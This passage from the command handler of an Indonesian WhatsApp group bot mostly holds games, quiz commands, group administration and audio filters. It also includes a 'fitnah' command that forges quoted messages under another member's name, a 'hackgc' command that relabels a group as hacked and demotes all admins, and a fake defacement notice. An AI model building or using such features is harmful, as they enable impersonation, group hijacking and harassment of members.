			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
		}
		break
	case  'suit': //nyolong dari zenz
		if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
		const userspilih = q
		if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
		var computer = Math.random();
		if (computer < 0.34) {
			computer = 'batu';
		} else if (computer >= 0.34 && computer < 0.67) {
			computer = 'gunting';
		} else {
			computer = 'kertas';
		}
		if (userspilih == computer) {
			reply(`Pertandingan Seri!`)
		} else if (userspilih == 'batu') {
			if (computer == 'gunting') {
				// hasil = 'MENANG';
				reply(`Kamu memilih Batu dan B0T Gunting\nKamu menang!`)
			} else {
				reply(`Kamu memilih Batu dan B0T memilih Kertas\nKamu kalah!`)
			}
		} else if (userspilih == 'gunting') {
			if (computer == 'batu') {
				// hasil = 'MENANG';
				reply(`Kamu memilih Gunting dan B0T memilih Batu\nKamu kalah!`)
			} else {
				reply(`Kamu memilih Gunting dan B0T Kertas\nKamu menang!`)
			}
		} else if (userspilih == 'kertas') {
			if (computer == 'batu') {
				// hasil = 'MENANG';
				reply(`Kamu memilih Kertas dan B0T Batu\nKamu menang!`)
			} else {
				reply(`Kamu memilih Kertas dan B0T memilih Gunting\nKamu kalah`)
			}
		}
		break
	/*-------------[ Tictactoe Handler ]-------------*/
	case 'tictactoe':
		if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
			const boardnow = setGame(`${from}`);
			const matrix = boardnow._matrix;
			const chatMove = `*🎮 Tictactoe Game 🎳*
     
     Sedang ada sesi permainan digrup ini\n\n@${boardnow.X} VS @${boardnow.O}
     
     ❌ : @${boardnow.X}
     ⭕ : @${boardnow.O}
     
     Giliran : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
     
          ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
          ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
          ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
     
     
     `;
			Revoer.sendMessage(from, chatMove, MessageType.text, {
				quoted: mek,
				contextInfo: {
					mentionedJid: [
						boardnow.X + "@s.whatsapp.net",
						boardnow.O + "@s.whatsapp.net",
					],
				},
			});
			return;
		}
		if (argss.length < 1)
			return reply(
				`Tag yang ingin jadi lawan anda!\n\nPenggunaan : *#tictactoe <@TagMember>*`
			);
		const boardnow = setGame(`${from}`);
		console.log(`Start Tictactore ${boardnow.session}`);
		boardnow.status = false;
		boardnow.X = sender.replace("@s.whatsapp.net", "");
		boardnow.O = argss[1].replace("@", "");
		fs.writeFileSync(
			`./lib/tictactoe/db/${from}.json`,
			JSON.stringify(boardnow, null, 2)
		);
		const strChat = `*🎮 Memulai game tictactoe 🎳*
     
     @${sender.replace(
			"@s.whatsapp.net",
			""
		)} menantang anda untuk menjadi lawan game
     
     _[ ${argss[1]} ] Ketik Y/N untuk menerima atau menolak permainan_ 
     `;
		Revoer.sendMessage(from, strChat, MessageType.text, {
			quoted: mek,
			contextInfo: {
				mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
			},
		});
		break
	case 'delttc':
		if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
			fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
			reply(`Berhasil menghapus sesi di grup ini!`);
		} else {
			reply(`Tidak ada sesi yg berlangsung, mohon ketik .tictactoe`);
		}
		break
	case 'tebakgambar':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://apidhani.herokuapp.com/api/game/tebakgambar?apikey=${dhakey}`, { method: 'get' })
		bufferkkk = await getBuffer(anu.image)
		setTimeout(() => {
			Revoer.sendMessage(from, '*➸ Jawaban :* ' + anu.jawaban, text, { quoted: mek }) // ur cods
		}, 30000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
		}, 20000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
		}, 10000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
		}, 2500) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, bufferkkk, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek}) // ur cods
		}, 0)
		break
	case 'susunkata':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		hmm = await fetchJson(`https://apidhani.herokuapp.com/api/game/susunkata?apikey=${dhakey}`)
		kon = hmm.result.jawaban
		load = `Susunlah Kata Dibawah Ini!!!\n${hmm.result.soal} \n\nCLUE: ${hmm.result.tipe}\nWaktu Hanya 30 Detik!`
		setTimeout(() => {
			Revoer.sendMessage(from, '*➸ Jawaban :* ' + kon , text, { quoted: mek }) // ur cods
		}, 30000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
		}, 20000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
		}, 10000) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
		}, 2500) // 1000 = 1s,
		setTimeout(() => {
			Revoer.sendMessage(from, load,text) // ur cods
		}, 0)
		break

	case 'manga':

		get_result = await fetchJson(`https://apidhani.herokuapp.com/api/anime/manga?search=${q}&apikey=${dhakey}`)
		ress = get_result.result.downloads
		ini_txt = 'BERIKUT ADALAH LIST MANGA VOLUME LENGKAP :\n\nNote : Salin dan Hapus Link ouo.io Dan sisakan link https://drivegoogle saja\n\n'
		for (var x of ress) {
			ini_txt += `Title : ${x.date}\n`
			ini_txt += `Link : ${x.link}\n\n`
		}
		reply(ini_txt)
		break

	case 'grupwa':

		get_result = await fetchJson(`https://kuhong-api.herokuapp.com/api/groupwa?query=${q}&apikey=${hong}`)
		ress = get_result.result
		ini_txt = 'HASIL PENCARIAN GRUP WHATSAPP\n\n'
		for (var x of ress) {
			ini_txt += `Subject : ${x.subject}\n`
			ini_txt += `Link : ${x.link}\n\n`
		}
		reply(ini_txt)
		break
	case  'kerangajaib':

		kerang = `_Fitur untuk random jawaban_
_hanya untuk fun_

❏ : *${prefix}apakah*
Format: /apakah (kata-kata)
Contoh: /apakah jokowi pengocok handal🤤?

❏ : *${prefix}kapankah*
Format: /kapankah (kata-kata)
Contoh: /kapankah hutang indonesia lunas?

❏ : *${prefix}bisakah*
Format: /bisakah (kata-kata)
Contoh: /bisakah jokowi stop jadi pengocok?`
		Revoer.sendMessage(from, kerang, text, { quoted: fgi, contextInfo: { "forwardingScore": 999, "isForwarded": true, sendEphemeral: true } })
		break

	case 'bisakah':
		bisakah = body.slice(8)
		const bisa = ['Bisa', 'Tidak Bisa', 'Coba Ulangi']
		const keh = bisa[Math.floor(Math.random() * bisa.length)]
		Revoer.sendMessage(from, 'Pertanyaan : *Bisakah' + bisakah + '*\n\nJawaban : ' + keh, text, { quoted: mek })
		break
	case 'kapan':
		case 'kapankah':
		kapankah = body.slice(6)
		const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', 'Yo ndak tau kok tanya saya', '3 Hari Lagi']
		const koh = kapan[Math.floor(Math.random() * kapan.length)]
		Revoer.sendMessage(from, 'Pertanyaan : *Kapan' + kapankah + '*\n\nJawaban : ' + koh, text, { quoted: mek })
		break
	case 'apakah':
		apakah = body.slice(7)
		const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi']
		const kah = apa[Math.floor(Math.random() * apa.length)]
		Revoer.sendMessage(from, 'Pertanyaan : *Apakah' + apakah + '*\n\nJawaban : ' + kah, text, { quoted: mek })
		break
	case 'nulis':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (args.length == 0) return reply(`Example: ${prefix + command} ily`)
		nulis = encodeURIComponent(q)
		ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/nulis?apikey=${LolKey}&text=${nulis}`)
		Revoer.sendMessage(from, ini_buffer, image, { mimetype: 'image/jpeg', quoted: mek, caption: "Nih" })
		break

	
case 'demote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Revoer.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Revoer.groupDemoteAdmin(from, mentioned)
}
break
case 'demoteall':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
Revoer.groupDemoteAdmin(from, members_id)
break
case 'promoteall':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
Revoer.groupMakeAdmin(from, members_id)
break
case 'add' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Yang mau di add siapa??')
if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan (628)')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Revoer.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply('Gagal menambahkan target, mungkin karena di private')
}
break
case "kick":
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (
mek.message.extendedTextMessage === undefined ||
mek.message.extendedTextMessage === null
)
return reply("Tag target yang ingin di kick!");
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
if (mentioned.length > 1) {
Revoer.groupRemove(from, mentioned); 
reply(mess.success);
} else if (mentioned.length < 1) {
anu = mek.message.extendedTextMessage.contextInfo.participant;
Revoer.groupRemove(from, [anu]);
reply(mess.success);
} else {
Revoer.groupRemove(from, mentioned);
reply(mess.success);
}
break;
case 'tagall':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? args.join(' ').trim() : ''
teks += `\n\n`
for (let mem of groupMembers) {
teks += `• @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'setname':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Revoer.groupUpdateSubject(from, `${body.slice(9)}`)
Revoer.sendMessage(from, `\`\`\`Sukses ✅, Mengganti nama grup menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: fgi })
break
case 'setdesc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
Revoer.groupUpdateDescription(from, `${body.slice(9)}`)
Revoer.sendMessage(from, `\`\`\`Sukses ✅, Mengganti deskripsi grup\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: fgi })
break
case 'setppgrup':
case 'setpp':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
let media = await Revoer.downloadMediaMessage(encmedia)
Revoer.updateProfilePicture(from, media)
.then((res) => reply(jsonformat(res)))
.catch((err) => reply(jsonformat(err)))
} else {
reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
break
case 'hidetag':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
try {
quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
hideTag(from, `${quotedText}`)
} catch {
hideTag(from, `${q}`)
}
break
case 'infogc':
case 'infogrup':
case 'infogroup':
case 'grupinfo':
case 'groupinfo':
if (!isGroup) return reply(mess.only.group)
try {
var pic = await Revoer.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup Utama:* Ya Mana Saya Tau Anjime\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n\n${groupMetadata.desc}`
Revoer.sendMessage(from, await getBuffer(pic), image, {mimetype:'image/jpeg',quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": from }})
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
json = ['action', 'inviteReset', from]
Revoer.query({json, expect200: true})
reply('Sukses Mereset Link Group')
break
case 'online':
case 'listonline':
case 'here':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
try {
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Revoer.chats.get(ido).presences), Revoer.user.jid]
Revoer.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
} catch (e) {
reply(`${e}`)
}
		break
	case 'fdeface':
		if (args.length < 1 ) return reply('Contoh : #fdeface RevzGanz&No System Is Safe&https://nasa.gov')
		var F = body.slice(8)
		var nama = F.split("&")[0];
		var deks = F.split("&")[1];
		var url = F.split("&")[2];
		Revoer.sendMessage(from, `THIS SITE HAS BEEN HACKED`, text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: nama , body: deks , previewType: "PHOTO", thumbnail: fs.readFileSync('./media/vanz.jpeg'), sourceUrl: url } } })
		break
	case 'hackgc':

		if (!isOwner && !mek.key.fromMe) return reply('*Kamu Owner?*')
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return ('Jadikan Bot Atmint Dulu :v')
		if (args.length < 1) return reply('Teksnya?')
		reply('Otw Hack')
		tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
		Revoer.updateProfilePicture(from, tessgc)
		
		Revoer.groupUpdateSubject(from, `HACKED BY ${q}`)
		Revoer.groupUpdateDescription(from, `_Owner ${q} Telah Meretas Grup ini_`)
		
		Revoer.sendMessage(from, 'Sukses Meretas Grup, Semua Admin Akan Diturunkan Dalam 7 Detik ', text, { quoted: fvoc })
		setTimeout(() => {
			Revoer.groupDemoteAdmin(from, groupAdmins) // ur cods
		}, 70000) // 1000 = 1s,
		break
	case  'fitnah':
		if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
		var gh = args.join(' ')
		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
		var target = gh.split("|")[1];
		var bot = gh.split("|")[2];
		Revoer.sendMessage(from, `${bot}`, text, { quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` } } })
		break
case 'sticktag':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Revoer.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await Revoer.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Revoer.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else {
reply(`*Reply sticker yang sudah dikirim*`)
}
break
case 'totag':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Revoer.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await Revoer.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Revoer.sendMessage(from, ini_buffer, sticker, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Revoer.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await Revoer.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Revoer.sendMessage(from, ini_buffer, image, options)
fs.unlinkSync(file)
} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Revoer.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await Revoer.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'audio/mp4',
ptt : true,
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Revoer.sendMessage(from, ini_buffer, audio, options)
fs.unlinkSync(file)
}  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
file = await Revoer.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
value = args.join(" ")
var group = await Revoer.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
mimetype : 'video/mp4',
contextInfo: { mentionedJid: mem },
quoted: mek
}
ini_buffer = fs.readFileSync(file)
Revoer.sendMessage(from, ini_buffer, video, options)
fs.unlinkSync(file)
} else{
reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
}
		break
	
case 'listadmin':
case 'adminlist':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `${no.toString()}. @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
break
case 'ownergrup':
case 'ownergroup':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
options = {
text: `Nih kak owner grupnya : https://wa.me/${from.split("-")[0]}`,
contextInfo: { mentionedJid: [from] }
}
Revoer.sendMessage(from, options, text, { quoted: mek })
break
case 'kontag':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
argzi = arg.split('|')
if (!argzi) return reply(`Penggunaan ${prefix}kontag @tag|nama`)
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
} else {
hideTagKontak(from, argzi[0], argzi[1])
}
break
case 'kontak':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
argzu = arg.split('|')
if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
sendKontak(from, mentioned[0].split('@')[0], argzu[1])
} else {
sendKontak(from, argzu[0], argzu[1])
}
break
	//**********Pengubah Suara***************///

	case 'gemes':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			riu = fs.readFileSync(ran)
			Revoer.sendMessage(from, riu, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Sukses Send Audio.'))
			fs.unlinkSync(ran)
		})
		break
	//Tempo Mengubah Suara Lebih Dering
	case 'tempo':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=12345" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi, duration: 99999999999 })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Sukses Cumy...'))
			fs.unlinkSync(ran)
		})
		break
	//nightcore Mengubah Suara Jadi Nada Rendah
	case 'nightcore':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi, duration: 999999999999 })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Send Audio Done..'))
			fs.unlinkSync(ran)
		})
		break

	//streo Mengubah Suara Menjadi Nada Super Rendah

	//fast Mengubah Suara Bernada Sedeng
	case 'fast':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=1.63,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			uhh = fs.readFileSync(ran)
			Revoer.sendMessage(from, uhh, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Done'))
			fs.unlinkSync(ran)
		})
		break
	//tupai Mengubah Suara Jadi  Lucu Lucu Gimana 
	case 'tupai':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
		encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.mp3')
		exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
			fs.unlinkSync(media)
			if (err) return reply('Error!')
			hah = fs.readFileSync(ran)
			Revoer.sendMessage(from, hah, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Done'))
			fs.unlinkSync(ran)
		})
		break
	//Gemuk Bersuara Besar Dan Dengung
	case 'gemok':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading Audio...'))
